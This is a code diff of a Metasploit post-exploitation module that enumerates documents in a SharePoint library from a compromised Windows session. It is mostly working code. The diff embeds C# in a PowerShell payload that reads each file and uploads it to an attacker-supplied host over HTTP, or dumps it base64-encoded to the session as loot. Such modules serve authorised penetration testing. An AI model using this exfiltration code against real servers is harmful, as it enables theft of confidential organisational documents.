@@ -1,7 +1,17 @@
 # frozen_string_literal: true
 
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 # Gathers documents from a SharePoint library using the .NET API.
 # Supports HTTP and Meterpreter exfiltration with size filtering.
+#
+# Enumerates and extracts documents from a specified SharePoint library using the
+# SharePoint .NET API. Runs in an existing Windows session (e.g., Meterpreter or shell)
+# on a SharePoint server, supporting HTTP or Meterpreter exfiltration with configurable
+# filters for file size and library targeting. Requires SharePoint assemblies access.
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Powershell
@@ -9,42 +19,28 @@ class MetasploitModule < Msf::Post
   Rank = NormalRanking
 
   def initialize(info = {})
-    super(update_info(info, metadata))
+    super(
+      update_info(
+        info,
+        'Name' => 'SharePoint Document Library Enumerator and Extractor',
+        'Description' => '
+          Enumerates and extracts documents from a specified SharePoint library using the
+          SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
+          on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
+          with configurable filters for file size and library targeting. Requires execution
+          in a context with access to SharePoint assemblies and appropriate permissions.',
+        'Author' => ['Vikram Verma'],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'Notes' => {
+          'Stability' => ['crash-safe'],
+          'Reliability' => ['repeatable-session'],
+          'SideEffects' => ['network-traffic']
+        }
+      )
+    )
     register_module_options
-  end
-
-  def metadata
-    {
-      'Name' => name,
-      'Description' => description,
-      'Author' => ['Vikram Verma'],
-      'License' => MSF_LICENSE,
-      'Platform' => 'win',
-      'Arch' => [ARCH_X86, ARCH_X64], 
-      'Notes' => notes
-    }
-  end
-
-  def name
-    'SharePoint Document Library Enumerator and Extractor'
-  end
-
-  def description
-    <<~DESC
-      Enumerates and extracts documents from a specified SharePoint library using the
-      SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
-      on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
-      with configurable filters for file size and library targeting. Requires execution
-      in a context with access to SharePoint assemblies and appropriate permissions.
-    DESC
-  end
-
-  def notes
-    {
-      'Stability' => ['crash-safe'],
-      'Reliability' => ['repeatable-session'],
-      'SideEffects' => ['network-traffic']
-    }
   end
 
   def register_module_options
@@ -70,7 +66,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    fail_with(Failure::NotVulnerable, 'No active session available') unless session
+    fail_with(Failure::BadConfig, 'No active session available') unless session
 
     handle_exfiltration_config
     execute_payload
@@ -78,7 +74,7 @@ class MetasploitModule < Msf::Post
 
   def execute_payload
     print_status('Generating SharePoint document extractor payload...')
-    encoded_cmd = encode_script(build_ps_payload) # Updated to use PowerShell mixin API
+    encoded_cmd = encode_script(build_ps_payload)
     print_status("Executing payload on target session #{session.sid}...")
     output = execute_script(encoded_cmd)
     process_output(output) if output
@@ -92,8 +88,7 @@ class MetasploitModule < Msf::Post
         #{build_dotnet_code}
         "@ -ReferencedAssemblies "Microsoft.SharePoint.dll","System.Web.dll" -ErrorAction Stop
         [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',
-          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},
-          #{datastore['MAX_SIZE']})
+          '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']}, #{datastore['MAX_SIZE']})
       } catch {
         Write-Output "FATAL:AssemblyLoadError:" + $_.Exception.Message
       }
@@ -108,13 +103,36 @@ class MetasploitModule < Msf::Post
       using System.Net;
 
       public class SharePointExtractor {
-        public static void ExtractDocs(string site_url, string library_name, string exfil_method, string exfil_host, int exfil_port, long max_size) {
+        public static void ExtractDocs(string site_url, string library_name, string exfil_host, int exfil_port, long max_size) {
           try {
             using (SPSite site = new SPSite(site_url)) {
               using (SPWeb web = site.OpenWeb()) {
-                SPList list = get_library(web, library_name);
-                if (list == null) return;
-                #{extract_library_logic}
+                SPList list = web.Lists[library_name];
+                if (list == null) { Console.WriteLine("ERROR:LibraryNotFound:" + library_name); return; }
+                SPDocumentLibrary library = list as SPDocumentLibrary;
+                if (library == null) { Console.WriteLine("ERROR:NotADocumentLibrary:" + library_name); return; }
+                Console.WriteLine("INFO:Enumerating:" + library_name + ":" + library.Items.Count + " items");
+                foreach (SPListItem item in library.Items) {
+                  try {
+                    SPFile file = item.File;
+                    if (file.Length > max_size) { Console.WriteLine("SKIP:SizeExceeded:" + file.Name + ":" + file.Length); continue; }
+                    byte[] file_bytes = file.OpenBinary();
+                    string file_name = file.Name;
+                    string encoded_file_name = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(file_name));
+                    if (!string.IsNullOrEmpty(exfil_host)) {
+                      using (WebClient client = new WebClient()) {
+                        client.Headers.Add("X-Filename", encoded_file_name);
+                        client.UploadData("http://" + exfil_host + ":" + exfil_port + "/upload", file_bytes);
+                        Console.WriteLine("SUCCESS:HTTP:" + encoded_file_name + ":" + file_bytes.Length);
+                      }
+                    } else {
+                      string b64 = Convert.ToBase64String(file_bytes);
+                      Console.WriteLine("FILE:" + encoded_file_name + ":" + b64);
+                    }
+                  } catch (Exception ex) {
+                    Console.WriteLine("ERROR:FileProcessing:" + item.Name + ":" + ex.Message);
+                  }
+                }
               }
             }
           } catch (Exception e) {
@@ -122,63 +140,6 @@ class MetasploitModule < Msf::Post
           }
         }
       }
-    CSHARP
-  end
-
-  def get_library(web, library_name)
-    web.Lists[library_name]
-  rescue StandardError
-    print_error("Library not found: #{library_name}")
-    nil
-  end
-
-  def extract_library_logic
-    <<~CSHARP
-      SPDocumentLibrary library = list as SPDocumentLibrary;
-      if (library == null) {
-        Console.WriteLine("ERROR:NotADocumentLibrary:" + library_name);
-        return;
-      }
-      Console.WriteLine("INFO:Enumerating:" + library_name + ":" + library.Items.Count + " items");
-      foreach (SPListItem item in library.Items) {
-        try {
-          SPFile file = item.File;
-          if (file.Length > max_size) {
-            Console.WriteLine("SKIP:SizeExceeded:" + file.Name + ":" + file.Length);
-            continue;
-          }
-          byte[] file_bytes = file.OpenBinary();
-          string file_name = file.Name;
-          #{exfiltrate_file(file_name: 'file_name', file_bytes: 'file_bytes')}
-        } catch (Exception ex) {
-          Console.WriteLine("ERROR:FileProcessing:" + item.Name + ":" + ex.Message);
-        }
-      }
-    CSHARP
-  end
-
-  def exfiltrate_file(file_name:, file_bytes:)
-    if datastore['EXFIL_METHOD'].upcase == 'HTTP' && !datastore['EXFIL_HOST'].empty?
-      http_exfil(file_name, file_bytes)
-    else
-      meterpreter_exfil(file_name, file_bytes)
-    end
-  end
-
-  def http_exfil(file_name, file_bytes)
-    <<~CSHARP
-      using (WebClient client = new WebClient()) {
-        client.Headers.Add("X-Filename", #{file_name});
-        client.UploadData("http://" + exfil_host + ":" + exfil_port + "/upload", #{file_bytes});
-        Console.WriteLine("SUCCESS:HTTP:" + #{file_name} + ":" + #{file_bytes}.Length);
-      }
-    CSHARP
-  end
-
-  def meterpreter_exfil(file_name, file_bytes)
-    <<~CSHARP
-      string b64 = Convert.ToBase64String(#{file_bytes});
-      Console.WriteLine("FILE:" + #{file_name} + ":" + b64);
     CSHARP
   end
 
@@ -210,11 +171,13 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def print_http_success(file_name, bytes)
+  def print_http_success(encoded_file_name, bytes)
+    file_name = Rex::Text.decode_base64(encoded_file_name)
     print_good("Exfiltrated #{file_name} via HTTP (#{bytes} bytes)")
   end
 
-  def save_file(file_name, b64_data)
+  def save_file(encoded_file_name, b64_data)
+    file_name = Rex::Text.decode_base64(encoded_file_name)
     file_path = store_loot('sharepoint.document', 'application/octet-stream', session,
                            Rex::Text.decode_base64(b64_data), file_name)
     print_good("Saved #{file_name} to #{file_path}")
